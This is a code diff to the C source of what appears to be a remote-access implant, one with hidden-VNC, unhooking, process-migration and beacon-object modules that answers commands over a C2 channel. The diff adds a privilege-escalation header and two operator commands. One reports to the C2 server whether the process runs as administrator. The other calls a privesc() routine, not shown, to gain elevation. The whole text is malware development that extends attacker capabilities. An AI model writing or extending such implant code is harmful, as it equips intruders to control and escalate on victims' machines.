@@ -11,6 +11,7 @@
 #include "hackmods/bof.h"
 #include "hackmods/unhook.h"
 #include "hackmods/critlib.h"
+#include "hackmods/privesc.h"
 #include "vnc/vnc.h"
 #include "vnc/hvnc.h"
 #include "utils/desktops.h"
@@ -51,6 +52,8 @@ enum Opcodes{
     MIGRATE, //1//migrate [pid]
     PS, //0//list processes
     CURRENTPID, //0
+    CHECKADMIN, //0
+    PRIVESC, //0
 };
 
 int parse(int mnem, unsigned char** sp, C2* conn){
@@ -174,6 +177,18 @@ int parse(int mnem, unsigned char** sp, C2* conn){
         char data[100] = {0};
         sprintf(data, "PID: %d", GetCurrentProcessId());
         sendC2(*conn, data, strlen(data));
+    }else if(mnem == CHECKADMIN){
+	    // Get current image's base address
+	    char data[100] = {0};
+	    if(IsProcessElevated()){
+            strcpy(data, "Admin privs present!");
+        }else{
+            strcpy(data, "Not admin");
+        }
+        sendC2(*conn, data, strlen(data));
+    }else if(mnem == PRIVESC){
+        if(!IsProcessElevated())
+            privesc();
     }else{
         return 1;
     }
